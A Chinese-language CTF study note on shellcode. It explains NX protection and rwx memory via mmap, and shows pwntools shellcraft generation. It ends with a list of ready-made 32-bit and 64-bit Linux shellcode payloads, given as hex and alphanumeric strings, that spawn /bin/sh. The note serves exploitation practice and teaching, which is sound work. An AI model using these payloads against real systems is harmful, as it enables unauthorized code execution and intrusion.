# shellcode
## 什么是shellcode
shellcode通常是指一段汇编代码，在执行后可以让我们来获取shell或者直接cat flag

## 什么时候可以用shellcode
### NX
通常而言，一般的题目都会打开NX保护，即栈不可执行，如下图
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250721170343.png)
可以看到栈(stack)部分是没有执行(x)的权限的，有执行权限的部分也没有写(w)的权限，这种情况下就无法注入shellcode来获取shell。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250721170530.png)
可以看到同样的代码中如果关闭NX保护，栈部分就有可执行权限，这种情况下就可以注入shellcode来执行。

### mmap
`void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);`
mmap函数是一个强大的系统调用，用于创建内存映射。它在内存管理、文件I/O和进程间通信中有广泛应用。
通常来说，在pwn题里，mmap函数用于改变一段地址的权限，通常出现在shellcode类型的题目中来改变某一段地址让其有rwx的权限来供攻击者来注入shellcode获取shell。
相同类型的函数还有mprotect等。

## 如何生成shellcode
pwntools集合了一个自动生产shellcode的函数
```
context(arch='i386', os='linux', log_level='debug')
shellcode = asm(shellcraft.sh())
```
用context.arch来设定需要生成shellcode是32位还是64位，即可自动生成一段shellcode
### 常见shellcode
```
32位 短字节shellcode --> 21字节
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

32位 纯ascii字符shellcode
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA

32位 scanf可读取的shellcode
\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh

64位 scanf可读取的shellcode 22字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05

64位 较短的shellcode  23字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

64位 纯ascii字符shellcode
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t

asm(shellcraft.sh())
```



